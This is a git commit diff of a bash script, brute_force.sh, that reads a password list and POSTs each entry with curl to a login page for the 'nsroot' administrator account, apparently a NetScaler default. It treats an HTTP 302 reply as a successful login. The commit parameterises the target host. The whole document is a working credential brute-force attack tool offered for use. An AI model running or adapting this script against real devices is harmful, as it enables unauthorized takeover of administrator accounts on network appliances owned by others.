20461d4452147baa57a0f33309e1724c38a3dc58
Core|Threat <30553333+ipcis@users.noreply.github.com>
2023-01-08 13:45:49 +0100

    Update brute_force.sh

--- brute_force.sh
+++ brute_force.sh
@@ -1,8 +1,10 @@
 #!/bin/bash
 
+target=$1
+
 while read line; do
     #login=$(curl -x http://127.0.0.1:8080/ -s -k -o /dev/null -d "username=nsroot&password=${line}&url=&timezone_offset=3600" -X POST http://192.168.1.88/login/do_login -w "%{http_code}")
-    login=$(curl -s -k -o /dev/null -d "username=nsroot&password=${line}&url=&timezone_offset=3600" -X POST http://192.168.1.88/login/do_login -w "%{http_code}")
+    login=$(curl -s -k -o /dev/null -d "username=nsroot&password=${line}&url=&timezone_offset=3600" -X POST https://$target/login/do_login -w "%{http_code}")
 
     if [ $login '==' "302" ]
         then
